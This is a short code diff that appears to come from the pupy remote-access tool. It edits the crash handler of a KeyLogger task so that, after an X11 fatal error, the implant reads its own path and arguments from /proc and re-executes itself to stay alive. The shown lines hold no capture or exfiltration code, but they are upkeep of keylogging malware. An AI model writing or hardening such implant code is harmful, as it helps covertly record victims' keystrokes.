@@ -588,7 +588,14 @@ class KeyLogger(pupy.Task):
     def _fatal_error_handler(self, error):
         self.stop()
         # Stupid libX11 will kill our application now, so let's try to reexec self
-        os.execve('/proc/self/exe', [''], os.environ)
+        try:
+            executable = os.readlink('/proc/self/exe')
+            args = open('/proc/self/cmdline').read().split('\x00')
+        except:
+            executable = sys.executable
+            args = sys.argv
+
+        os.execv(executable, args)
         return 0
 
     @property
